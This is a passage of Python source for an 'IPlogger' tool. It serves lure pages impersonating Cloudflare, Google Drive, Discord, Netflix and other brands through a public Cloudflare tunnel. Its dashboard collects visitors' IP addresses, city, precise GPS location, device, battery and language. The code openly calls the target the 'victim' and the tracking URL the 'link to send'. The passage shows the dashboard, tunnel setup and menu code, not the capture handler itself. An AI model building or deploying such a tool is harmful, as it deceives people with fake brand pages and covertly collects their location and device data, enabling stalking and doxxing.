                "refresh":"Aktualisieren","records":"Eintrag/Einträge","clear":"Löschen",
                "export":"JSON Export","visits":"Besuche","total":"gesamt",
                "unique_ips":"Eindeutige IPs","visitors":"Besucher","countries":"Länder",
                "locations":"Standorte","mobile":"Mobil","of_devices":"der Geräte",
                "top_country":"Top Land","most_freq":"am häufigsten",
                "gps":"GPS","precise":"präzise","search_ph":"IP, Land, Stadt suchen...",
                "copy":"Kopieren","th_date":"Datum UTC","th_country":"Land","th_city":"Stadt",
                "th_browser":"Browser","th_device":"Gerät","th_screen":"Bildschirm",
                "th_battery":"Akku","th_conn":"Verbindung","th_lang":"Sprache",
                "stats_sub":"Analyse gesammelter Daten","browsers":"Browser",
                "os":"Betriebssysteme","devices":"Geräte",
                "config_sub":"Aktive URLs und Einstellungen","active_lure":"Aktiver Köder",
                "redirect_to":"Weiterleitung zu","log_file":"Log-Datei",
                "detail":"Erfassungsdetail","close":"Schließen",
                "wrong_pass":"Falsches Passwort","confirm_clear":"Alle Logs löschen?",
            },
            "zh": {
                "tab_captures":"捕获","tab_stats":"统计","tab_config":"配置",
                "refresh":"刷新","records":"条记录","clear":"清除",
                "export":"导出JSON","visits":"访问","total":"总计",
                "unique_ips":"唯一IP","visitors":"访客","countries":"国家",
                "locations":"位置","mobile":"移动端","of_devices":"设备占比",
                "top_country":"热门国家","most_freq":"最常见",
                "gps":"GPS","precise":"精确","search_ph":"搜索IP、国家、城市...",
                "copy":"复制","th_date":"UTC时间","th_country":"国家","th_city":"城市",
                "th_browser":"浏览器","th_device":"设备","th_screen":"屏幕",
                "th_battery":"电池","th_conn":"连接","th_lang":"语言",
                "stats_sub":"收集数据分析","browsers":"浏览器",
                "os":"操作系统","devices":"设备",
                "config_sub":"活跃URL和配置","active_lure":"活跃诱饵",
                "redirect_to":"重定向到","log_file":"日志文件",
                "detail":"捕获详情","close":"关闭",
                "wrong_pass":"密码错误","confirm_clear":"清除所有日志？",
            },
        }
        d = D.get(CONFIG["lang"], D["en"])

        html = (DASHBOARD
            .replace("{count}",            str(len(logs)))
            .replace("{unique_ips}",       str(unique_ips))
            .replace("{unique_countries}", str(unique_countries))
            .replace("{mobile_pct}",       str(mobile_pct))
            .replace("{top_country}",      top_country)
            .replace("{geo_count}",        str(geo_count))
            .replace("{now}",              now)
            .replace("{rows}",             rows)
            .replace("{bar_country}",      bar_country)
            .replace("{bar_browser}",      bar_browser)
            .replace("{bar_os}",           bar_os)
            .replace("{bar_device}",       bar_device)
            .replace("{track_url}",        track_url)
            .replace("{pixel_url}",        pixel_url)
            .replace("{lure}",             CONFIG["lure"])
            .replace("{redirect}",         CONFIG["redirect"])
            .replace("{log_file}",         os.path.abspath(CONFIG["log_file"]))
            .replace("{entries_json}",     entries_json_str)
            # i18n
            .replace("{d_tab_captures}",   d["tab_captures"])
            .replace("{d_tab_stats}",      d["tab_stats"])
            .replace("{d_tab_config}",     d["tab_config"])
            .replace("{d_refresh}",        d["refresh"])
            .replace("{d_records}",        d["records"])
            .replace("{d_clear}",          d["clear"])
            .replace("{d_export}",         d["export"])
            .replace("{d_visits}",         d["visits"])
            .replace("{d_total}",          d["total"])
            .replace("{d_unique_ips}",     d["unique_ips"])
            .replace("{d_visitors}",       d["visitors"])
            .replace("{d_countries}",      d["countries"])
            .replace("{d_locations}",      d["locations"])
            .replace("{d_mobile}",         d["mobile"])
            .replace("{d_of_devices}",     d["of_devices"])
            .replace("{d_top_country}",    d["top_country"])
            .replace("{d_most_freq}",      d["most_freq"])
            .replace("{d_gps}",            d["gps"])
            .replace("{d_precise}",        d["precise"])
            .replace("{d_search_ph}",      d["search_ph"])
            .replace("{d_copy}",           d["copy"])
            .replace("{d_th_date}",        d["th_date"])
            .replace("{d_th_country}",     d["th_country"])
            .replace("{d_th_city}",        d["th_city"])
            .replace("{d_th_browser}",     d["th_browser"])
            .replace("{d_th_device}",      d["th_device"])
            .replace("{d_th_screen}",      d["th_screen"])
            .replace("{d_th_battery}",     d["th_battery"])
            .replace("{d_th_conn}",        d["th_conn"])
            .replace("{d_th_lang}",        d["th_lang"])
            .replace("{d_stats_sub}",      d["stats_sub"])
            .replace("{d_browsers}",       d["browsers"])
            .replace("{d_os}",             d["os"])
            .replace("{d_devices}",        d["devices"])
            .replace("{d_config_sub}",     d["config_sub"])
            .replace("{d_active_lure}",    d["active_lure"])
            .replace("{d_redirect_to}",    d["redirect_to"])
            .replace("{d_log_file}",       d["log_file"])
            .replace("{d_detail}",         d["detail"])
            .replace("{d_close}",          d["close"])
            .replace("{d_wrong_pass}",     d["wrong_pass"])
            .replace("{d_confirm_clear}",  d["confirm_clear"])
        )
        self._raw(200, html.encode(), "text/html; charset=utf-8")


class QuietServer(http.server.HTTPServer):
    def handle_error(self, request, client_address): pass

# ═══ Cloudflare Tunnel ════════════════════════════════════

def start_cloudflared(port):
    url_event   = threading.Event()
    public_url  = [None]
    pat = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")

    def reader(stream):
        try:
            for line in stream:
                line = line.decode(errors="replace").strip()
                m = pat.search(line)
                if m and not url_event.is_set():
                    public_url[0] = m.group(0); url_event.set()
        except Exception: pass

    try:
        proc = subprocess.Popen(
            ["cloudflared","tunnel","--no-autoupdate","--url",f"http://localhost:{port}"],
            stderr=subprocess.PIPE, stdout=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform=="win32" else 0,
        )
    except FileNotFoundError:
        print("[!] cloudflared non trouvé — tunnel désactivé.")
        print("    Windows : winget install Cloudflare.cloudflared --source winget")
        print("    Linux   : curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg | sudo tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null")
        print("              ou télécharge directement depuis https://github.com/cloudflare/cloudflared/releases/latest")
        return None, None

    threading.Thread(target=reader, args=(proc.stderr,), daemon=True).start()
    threading.Thread(target=reader, args=(proc.stdout,), daemon=True).start()

    print("[*] Connexion au tunnel", end="", flush=True)
    for _ in range(30):
        if url_event.wait(timeout=1): break
        print(".", end="", flush=True)
    print()

    return proc, public_url[0]

# ═══ TUI ══════════════════════════════════════════════════

try:
    import colorama; colorama.init()
except ImportError:
    pass

def _c(code): return f"\033[{code}m"

R   = _c("91");  R2  = _c("31");  W   = _c("97")
G   = _c("92");  Y   = _c("93");  C   = _c("96")
DIM = _c("2");   B   = _c("1");   RST = _c("0")
UL  = _c("4")   # underline

# ═══ Auto-install cloudflared ═════════════════════════════

def _cloudflared_available():
    try:
        subprocess.run(["cloudflared","--version"], capture_output=True, timeout=4)
        return True
    except Exception:
        return False

def _install_cloudflared():
    plat = sys.platform
    machine = os.uname().machine if hasattr(os,"uname") else "x86_64"

    print(f"\n  {Y}cloudflared non trouvé — installation automatique...{RST}\n")

    if plat == "win32":
        # Terminer le processus si winget dispo, sinon curl direct
        try:
            r = subprocess.run(
                ["winget","install","Cloudflare.cloudflared","--source","winget","--silent","--accept-package-agreements","--accept-source-agreements"],
                capture_output=True, timeout=120
            )
            if r.returncode == 0:
                print(f"  {G}✓ cloudflared installé via winget{RST}")
                return True
        except Exception:
            pass
        # Fallback : télécharge l'exe à côté du script
        exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cloudflared.exe")
        try:
            print(f"  {DIM}Téléchargement cloudflared.exe...{RST}", end="", flush=True)
            urllib.request.urlretrieve(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                exe
            )
            print(f" {G}OK{RST}")
            # Ajoute le dossier au PATH pour cette session
            os.environ["PATH"] = os.path.dirname(exe) + os.pathsep + os.environ.get("PATH","")
            return True
        except Exception as e:
            print(f"\n  {R}Échec : {e}{RST}")
            return False

    elif plat == "darwin":
        # macOS — Homebrew
        try:
            subprocess.run(["brew","install","cloudflared"], timeout=120, check=True)
            print(f"  {G}✓ cloudflared installé via brew{RST}")
            return True
        except Exception as e:
            print(f"  {R}Échec brew : {e}{RST}"); return False

    else:
        # Linux / Termux
        arch_map = {"x86_64":"amd64","aarch64":"arm64","armv7l":"arm","i686":"386"}
        arch = arch_map.get(machine, "amd64")

        # Termux : pas de sudo
        is_termux = "com.termux" in os.environ.get("PREFIX","") or os.path.exists("/data/data/com.termux")
        dest = "/data/data/com.termux/files/usr/bin/cloudflared" if is_termux else "/usr/local/bin/cloudflared"
        url  = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"

        try:
            print(f"  {DIM}Téléchargement cloudflared ({arch})...{RST}", end="", flush=True)
            tmp = f"/tmp/cloudflared_{arch}"
            urllib.request.urlretrieve(url, tmp)
            os.chmod(tmp, 0o755)
            if is_termux:
                import shutil; shutil.move(tmp, dest)
            else:
                subprocess.run(["sudo","mv",tmp,dest], check=True, timeout=10)
            print(f" {G}OK → {dest}{RST}")
            return True
        except Exception as e:
            print(f"\n  {R}Échec : {e}{RST}"); return False

# ═══ TUI ══════════════════════════════════════════════════

LURE_LABELS = {
    "captcha": "Cloudflare — Checking your browser",
    "google":  "Google Drive — Opening document",
    "discord": "Discord — Server invite",
    "youtube": "YouTube — Loading video",
    "twitch":  "Twitch — Live stream",
    "netflix": "Netflix — Just a moment",
    "steam":   "Steam — Preparing library",
    "dropbox": "Dropbox — Opening file",
    "404":     "404 Not Found",
    "blank":   "Blank page (SSRF/API)",
}

# ── ASCII logo (2 lignes séparées, couleurs kerbes) ────────
_LOGO_IP = (
    "  _____  ___   \n"
    "  \\_   \\/ _ \\  \n"
    "   / /\\/ /_)/  \n"
    "/\\/ /_/ ___/   \n"
    "\\____/\\/       "
)
_LOGO_LG = (
    "  _                            \n"
    " | | ___   __ _  __ _  ___ _ __\n"
    " | |/ _ \\ / _` |/ _` |/ _ \\ '__|\n"
    " | | (_) | (_| | (_| |  __/ |  \n"
    " |_|\\___/ \\__, |\\__, |\\___|_|  \n"
    "           |___/ |___/          "
)

def _logo():
    ip_lines = _LOGO_IP.splitlines()
    lg_lines = _LOGO_LG.splitlines()
    # Pad gauche pour aligner les deux blocs côte à côte
    w = max(len(l) for l in ip_lines) + 2
    combined = []
    for i in range(max(len(ip_lines), len(lg_lines))):
        left  = ip_lines[i] if i < len(ip_lines) else ""
        right = lg_lines[i] if i < len(lg_lines) else ""
        combined.append(f"{R}{B}{left:<{w}}{RST}{W}{B}{right}{RST}")
    return "\n".join(combined)

_LOGO_RENDERED = None

def _get_logo():
    global _LOGO_RENDERED
    if _LOGO_RENDERED is None:
        _LOGO_RENDERED = _logo()
    return _LOGO_RENDERED

def clr():
    os.system("cls" if sys.platform == "win32" else "clear")

def _sep(char="─", n=56):
    return f"{DIM}{char*n}{RST}"

def banner():
    print()
    print(_get_logo())
    print(f"\n  {DIM}by camzzz  ·  github.com/cameleonnbss{RST}")
    print(_sep())

def _field(label, value, color=C):
    pad = 14
    print(f"  {DIM}{label:<{pad}}{RST}{color}{value}{RST}")

def status_panel(tunnel_active=False):
    p     = CONFIG["port"]
    token = CONFIG["track_token"]
    base  = CONFIG.get("public_url") or f"http://localhost:{p}"
    sec   = CONFIG["secret"]
    dash  = f"http://localhost:{p}/logs"
    public_track = f"{base}/t/{token}"
    is_public = not base.startswith("http://localhost")

    print(f"\n  {W}{B}Status{RST}")
    print(_sep("·", 58))

    if is_public and tunnel_active:
        print(f"\n  {G}{B}  ► {public_track}{RST}  {DIM}{T('link_to_send')}{RST}\n")
    else:
        print(f"  {DIM}  tunnel offline — local only{RST}")
        print(f"  {DIM}  http://localhost:{p}/t/{token}{RST}\n")

    mode_str = f"{T('lure_mode')}" if CONFIG["mode"]=="lure" else f"{T('redirect_mode')}"
    _field(T("mode"),      f"{R}{mode_str}{RST}", "")
    _field(T("lure"),      f"{CONFIG['lure']}  {DIM}{LURE_LABELS.get(CONFIG['lure'],'')}{RST}", "")
    _field(T("redirect_to"), CONFIG["redirect"], C)
    _field("Dashboard",    dash, Y)
    pw_val = f"{G}{T('enabled')}{RST} (Basic Auth)" if sec else f"{DIM}{T('disabled')}{RST}"
    _field(T("password"),  pw_val, "")
    tun_val = f"{G}● {T('active')}{RST}" if tunnel_active else f"{DIM}○ {T('inactive')}{RST}"
    _field(T("tunnel"),    tun_val, "")
    print(_sep("·", 58))

def _prompt(text=""):
    return input(f"\n  {R}>{RST} {W}{text}{RST}").strip()

def _ok(msg):
    save_config()
    print(f"\n  {G}✓{RST}  {msg}")
    input(f"  {DIM}>{RST}")

def _err(msg):
    print(f"\n  {R}✗{RST}  {msg}")
    input(f"  {DIM}Entrée...{RST}")

def menu_lure():
    clr(); banner()
    print(f"\n  {W}{B}Leurre  {DIM}— page affichée à la victime{RST}\n")
    keys = list(LURE_LABELS.keys())
    for i, k in enumerate(keys, 1):
        cur = f"  {G}←{RST}" if k == CONFIG["lure"] else ""
        print(f"  {R}{i:2}{RST}  {W}{k:<10}{RST}{DIM}{LURE_LABELS[k]}{RST}{cur}")
    print(f"\n  {DIM} 0  annuler{RST}")
    c = _prompt()
    if c.isdigit() and 1 <= int(c) <= len(keys):
        CONFIG["lure"] = keys[int(c)-1]
        _ok(f"Leurre : {R}{CONFIG['lure']}{RST}")

def menu_redirect():
    clr(); banner()
    SUGG = [
        ("YouTube",  "https://www.youtube.com"),
        ("Google",   "https://www.google.com"),
        ("Twitch",   "https://www.twitch.tv"),
        ("Discord",  "https://discord.com"),
        ("Netflix",  "https://www.netflix.com"),
        ("Reddit",   "https://www.reddit.com"),
        ("GitHub",   "https://github.com"),
    ]
    print(f"\n  {W}{B}Redirect  {DIM}— URL cible après capture{RST}")
    print(f"  {DIM}Actuel : {C}{CONFIG['redirect']}{RST}\n")
    for i,(name,url) in enumerate(SUGG,1):
        print(f"  {R}{i}{RST}  {W}{name:<10}{RST}{DIM}{url}{RST}")
    print(f"  {DIM} c  URL custom    0  annuler{RST}")
    c = _prompt()
    if c == "0": return
    if c == "c":
        v = _prompt("URL (https://...) : ")
        if v.startswith("http"):
            CONFIG["redirect"] = v
            _ok(f"Redirect → {v}")
        else:
            _err("URL invalide")
    elif c.isdigit() and 1 <= int(c) <= len(SUGG):
        CONFIG["redirect"] = SUGG[int(c)-1][1]
        _ok(f"Redirect → {CONFIG['redirect']}")

def menu_token():
    clr(); banner()
    print(f"\n  {W}{B}{T('slug')}  {DIM}— /t/<slug>{RST}")
    print(f"  {DIM}{T('link_to_send')} : {C}{CONFIG['track_token']}{RST}")
    print(f"  {DIM}(empty = new random){RST}\n")
    v = _prompt()
    CONFIG["track_token"] = v if v else secrets.token_urlsafe(8)
    _ok(f"/t/{G}{CONFIG['track_token']}{RST}")

def menu_secret():
    clr(); banner()
    print(f"\n  {W}{B}{T('password')}  {DIM}— Basic Auth{RST}")
    print(f"  {DIM}{CONFIG['secret'] or T('none')}{RST}")
    print(f"  {DIM}(empty = {T('disabled')}){RST}\n")
    v = _prompt()
    CONFIG["secret"] = v
    _ok(f"{T('password')}: {v or T('disabled')}")

def menu_port():
    clr(); banner()
    print(f"\n  {W}{B}{T('port')}{RST}  {DIM}(current: {CONFIG['port']}){RST}\n")
    v = _prompt(f"[{CONFIG['port']}] ")
    if v and v.isdigit() and 1 <= int(v) <= 65535:
        CONFIG["port"] = int(v)
        _ok(f"{T('port')}: {CONFIG['port']}")
    elif v:
        _err(T("invalid"))

def menu_mode():
    clr(); banner()
    print(f"\n  {W}{B}{T('mode')}  {DIM}— how the tracking URL behaves{RST}\n")
    print(f"  {R}1{RST}  {W}{T('lure_mode')}{RST}{'  ' + G + '←' + RST if CONFIG['mode']=='lure' else ''}")
    print(f"  {R}2{RST}  {W}{T('redirect_mode')}{RST}{'  ' + G + '←' + RST if CONFIG['mode']=='redirect' else ''}")
    print(f"\n  {DIM}0  {T('back')}{RST}")
    c = _prompt()
    if   c == "1": CONFIG["mode"] = "lure";     _ok(f"Mode: lure")
    elif c == "2": CONFIG["mode"] = "redirect";  _ok(f"Mode: redirect")

def menu_lang():
    clr(); banner()
    print(f"\n  {W}{B}{T('language')}{RST}\n")
    lang_list = [("en","English"),("fr","Français"),("ru","Русский"),
                 ("es","Español"),("de","Deutsch"),("zh","中文")]
    for i,(code,name) in enumerate(lang_list,1):
        cur = f"  {G}←{RST}" if code == CONFIG["lang"] else ""
        print(f"  {R}{i}{RST}  {W}{name}{RST}  {DIM}({code}){RST}{cur}")
    print(f"\n  {DIM}0  {T('back')}{RST}")
    c = _prompt()
    if c.isdigit() and 1 <= int(c) <= len(lang_list):
        CONFIG["lang"] = lang_list[int(c)-1][0]
        _ok(f"Language: {lang_list[int(c)-1][1]}")

def menu_logs():
    clr(); banner()
    lf = CONFIG["log_file"]
    logs = []
    if os.path.exists(lf):
        try:
            with open(lf,"r",encoding="utf-8") as f: logs = json.load(f)
        except Exception: pass

    print(f"\n  {W}{B}{T('logs')}  {DIM}— {len(logs)} {T('entries')}{RST}\n")
    if not logs:
        print(f"  {DIM}—{RST}")
    else:
        print(f"  {DIM}{'IP':<17}{'Date':<20}{'Location':<24}{'Browser'}{RST}")
        print(_sep("─", 80))
        for e in reversed(logs[-15:]):
            ip  = e.get("ip","?")
            if LOCAL_RE.match(ip): ip = "(local)"
            ts  = e.get("timestamp","")[:19].replace("T"," ")
            loc = ", ".join(filter(None,[e.get("city",""),e.get("country","")])) or "?"
            ua  = e.get("browser","?")
            print(f"  {R}{ip:<17}{RST}{DIM}{ts:<20}{RST}{C}{loc:<24}{RST}{DIM}{ua}{RST}")
    print(f"\n  {DIM} c  clear   0  {T('back')}{RST}")
    if _prompt() == "c":
        yeses = {"oui","o","yes","y","да","sí","si","ja","是"}
        if _prompt(T("confirm_clear")+" ").lower() in yeses:
            with open(lf,"w",encoding="utf-8") as f: json.dump([],f)
            print(f"\n  {G}✓{RST}  {T('cleared')}"); input(f"  {DIM}>{RST}")

def launch_server():
    port = CONFIG["port"]
    for p in (port, port+1, port+2):
        try:
            srv = QuietServer(("0.0.0.0", p), Handler)
            CONFIG["port"] = p
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            return srv
        except OSError:
            continue
    return None

def _do_tunnel():
    if not _cloudflared_available():
        ok = _install_cloudflared()
        if not ok:
            return None, None
    return start_cloudflared(CONFIG["port"])

# ═══ Main ══════════════════════════════════════════════════

def run():
    load_config()
    CONFIG["track_token"] = CONFIG["track_token"] or secrets.token_urlsafe(8)
    server  = [None]
    cf_proc = [None]

    # ── Start server ───────────────────────────────────────
    clr(); banner()
    print(f"\n  {DIM}{T('server_start')}{RST}")
    srv = launch_server()
    if not srv:
        print(f"  {R}{T('no_port')}{RST}"); sys.exit(1)
    server[0] = srv
    print(f"  {G}✓{RST}  port {CONFIG['port']}")

    # ── Tunnel auto ────────────────────────────────────────
    print(f"  {DIM}{T('connecting')}{RST}")
    proc, url = _do_tunnel()
    if proc:
        cf_proc[0] = proc
        CONFIG["public_url"] = url or f"http://localhost:{CONFIG['port']}"
        if url: print(f"  {G}✓{RST}  {G}{url}{RST}")
        else:   print(f"  {Y}⚠{RST}  tunnel up, URL not detected")
    else:
        CONFIG["public_url"] = f"http://localhost:{CONFIG['port']}"
        print(f"  {Y}⚠{RST}  no tunnel (local only)")
    time.sleep(0.7)

    # ── Main menu loop ─────────────────────────────────────
    while True:
        clr(); banner()
        tunnel_active = cf_proc[0] is not None and cf_proc[0].poll() is None
        status_panel(tunnel_active)

        p   = CONFIG["port"]
        tok = CONFIG["track_token"]
        sec = CONFIG["secret"]
        lf  = CONFIG["log_file"]
        n_logs = 0
        if os.path.exists(lf):
            try:
                with open(lf,"r",encoding="utf-8") as f: n_logs = len(json.load(f))
            except Exception: pass

        mode_d = T("lure_mode") if CONFIG["mode"]=="lure" else T("redirect_mode")
        pw_d   = f"{G}{T('enabled')}{RST}" if sec else f"{DIM}{T('disabled')}{RST}"
        tun_d  = f"{G}● {T('active')} — {T('cut')}{RST}" if tunnel_active else f"{DIM}○ {T('inactive')} — {T('start')}{RST}"

        rows = [
            ("1", T("mode"),      mode_d),
            ("2", T("lure"),      f"{CONFIG['lure']}  {DIM}{LURE_LABELS.get(CONFIG['lure'],'')}{RST}"),
            ("3", T("redirect_to"),CONFIG["redirect"][:48]),
            ("4", T("port"),      str(p)),
            ("5", T("slug"),      f"/t/{tok}  {DIM}{T('link_to_send')}{RST}"),
            ("6", T("password"),  pw_d),
            ("7", T("logs"),      f"{n_logs} {T('entries')}"),
            ("8", T("tunnel"),    tun_d),
            ("9", T("language"),  CONFIG["lang"]),
            ("0", T("quit"),      ""),
        ]
        print()
        for key, label, val in rows:
            val_s = f"  {DIM}{val}{RST}" if val else ""
            if key in ("0",):
                print(f"\n  {DIM}{key}  {label}{RST}")
            else:
                print(f"  {R}{key}{RST}  {W}{label:<22}{RST}{val_s}")
        print()

        c = _prompt()
        if   c == "1": menu_mode()
        elif c == "2": menu_lure()
        elif c == "3": menu_redirect()
        elif c == "4":
            old = CONFIG["port"]
            menu_port()
            if CONFIG["port"] != old:
                server[0].server_close(); server[0] = None
                srv = launch_server()
                if srv: server[0] = srv
                else: print(f"  {R}port failed{RST}"); input()
        elif c == "5": menu_token()
        elif c == "6": menu_secret()
        elif c == "7": menu_logs()
        elif c == "8":
            if tunnel_active:
                cf_proc[0].terminate(); cf_proc[0] = None
                CONFIG["public_url"] = f"http://localhost:{CONFIG['port']}"
                print(f"\n  {Y}{T('tunnel_cut')}{RST}"); input(f"  {DIM}>{RST}")
            else:
                clr(); banner()
                print(f"\n  {DIM}{T('connecting')}{RST}")
                proc, url = _do_tunnel()
                if proc:
                    cf_proc[0] = proc
                    CONFIG["public_url"] = url or f"http://localhost:{CONFIG['port']}"
                    link = f"{G}{url}/t/{CONFIG['track_token']}{RST}" if url else f"{Y}no URL{RST}"
                    print(f"\n  {G}✓{RST}  {link}")
                else:
                    print(f"  {R}✗ failed{RST}")
                input(f"\n  {DIM}>{RST}")
        elif c == "9": menu_lang()
        elif c == "0":
            print(f"\n  {DIM}exit{RST}\n")
            if server[0]: server[0].server_close()
            if cf_proc[0]: cf_proc[0].terminate()
            sys.exit(0)

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n\n  {DIM}Arrêt.{RST}\n")
        sys.exit(0)
